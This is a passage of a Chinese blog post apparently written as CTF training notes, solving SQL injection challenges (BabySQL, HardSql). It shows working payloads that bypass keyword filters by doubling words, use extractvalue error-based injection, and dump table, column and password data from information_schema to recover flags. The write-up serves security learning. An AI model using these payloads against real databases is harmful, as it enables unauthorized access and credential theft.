+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606753067571.png" alt="1606753067571"></p>
+<p>试的我心情迷幻，怎么还有，于是跳着试。</p>
+<p>试到16个的时候终于看到flag了!</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606753207312.png" alt="1606753207312"></p>
+<p>但显示的不全，得想个办法补全。</p>
+<p>使用substring函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and extractvalue(1,concat(0x7e,substring((select concat(id,username,password) from l0ve1ysq1 limit 15,1),30,32)))))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606754434578.png" alt="1606754434578"></p>
+<p>拼和一下，16flagflag{cceea66c-13d4-4269-9017-c60c8e1afdc3}120。</p>
+<p>得到<strong>flag{cceea66c-13d4-4269-9017-c60c8e1afdc3}</strong></p>
+<p>百度了一下其他答案，发现其实不用报错注入也可以！</p>
+<p>末尾的#换成%23即可。</p>
+<h2 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606754789043.png" alt="1606754789043"></p>
+<p>这次万能密码不管用了。</p>
+<p>提示上说过滤严格，那就先看看过滤了啥。</p>
+<p>屏蔽了and，or，by，select，union，where……能有的常用词都给过滤了。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606755263786.png" alt="1606755263786"></p>
+<p>试了下双写，发现可以成功绕过！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; oorrder bbyy 4#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606755381831.png" alt="1606755381831"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,2,3#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606755433302.png" alt="1606755433302"></p>
+<p>后面的除了加双写绕过，没什么太多不同的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606789928054.png" alt="1606789928054"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=&#x27;b4bsql&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606790055336.png" alt="1606790055336"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql#</span><br></pre></td></tr></table></figure>
+
+<p>最后这里还有个坑，password 的or要双写。</p>
+<p>拿到flag{92167805-df49-4932-a48d-d4b68d8452ed}。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606790232169.png" alt="1606790232169"></p>
+<h2 id="HardSql"><a href="#HardSql" class="headerlink" title="HardSql"></a>HardSql</h2><p>测试后发现过滤了：and，union，by，空格。</p>
+<p>常规注入不行了，走报错注入。空格用括号绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;^extractvalue(1,concat(0x7e,(select(database()))))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606965889927.png" alt="1606965889927"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#x27;geek&#x27;)))))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606966707291.png" alt="1606966707291"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#x27;H4rDsq1&#x27;)))))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606966815400.png" alt="1606966815400"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1))))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1606966963805.png" alt="1606966963805"></p>
+<p>爆出来了一半flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))#</span><br></pre></td></tr></table></figure>
+
+<p>exractvaule有限制长度为32，使用substr限制下长度，再拼接。</p>
+<p>结果发现substr也被限制了，试试left（）和right（）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;^extractvalue(1,concat(0x7e,left((select(password)from(H4rDsq1)),32)))#</span><br><span class="line">1&#x27;^extractvalue(1,concat(0x7e,right((select(password)from(H4rDsq1)),32)))#</span><br></pre></td></tr></table></figure>
+
+<p>左：~flag{d1acc612-0727-4f5e-95a5-0</p>
+<p>右：~612-0727-4f5e-95a5-067b469ad3bc</p>
+<p>拼接获得flag：flag{d1acc612-0727-4f5e-95a5-067b469ad3bc}</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>关于sql的一些函数：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luxd/p/5976744.html">https://www.cnblogs.com/luxd/p/5976744.html</a></p>
+<p>一些绕过方式：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/x_kernel_2719/article/details/82843839">https://blog.csdn.net/x_kernel_2719/article/details/82843839</a></p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          Donate
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://www.soyawww.com/2020/10/30/%E5%9F%B9%E8%AE%ADday3/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%80%9D%E8%B7%AF%E8%AE%B0%E5%BD%95/" rel="tag">思路记录</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/11/03/%E5%9F%B9%E8%AE%ADday4/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            培训的那些日子day4
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/10/26/%E5%9F%B9%E8%AE%AD%E7%9A%84day2/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">培训的那些日子day2</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "4C1UYtlJuMPjaLshBufGIn2e-gzGzoHsz",
+    app_key: "NbpumEIJ4G7cOOl9aQOS4YsR",
+    path: window.location.pathname,
+    avatar: "mp",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2019-2021
+        <i class="ri-heart-fill heart_icon"></i> soya
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/%E5%85%B6%E4%BB%96%E7%BE%8E%E5%8C%96/%E5%A4%B4%E5%83%8F.jpg" alt="soya的小屋"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=264731930&auto=0&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+  <!--浏览器搞笑标题-->
+<script type="text/javascript" src="/js/Funnytitle.js"></script>
+
+</body>
+
+</html>
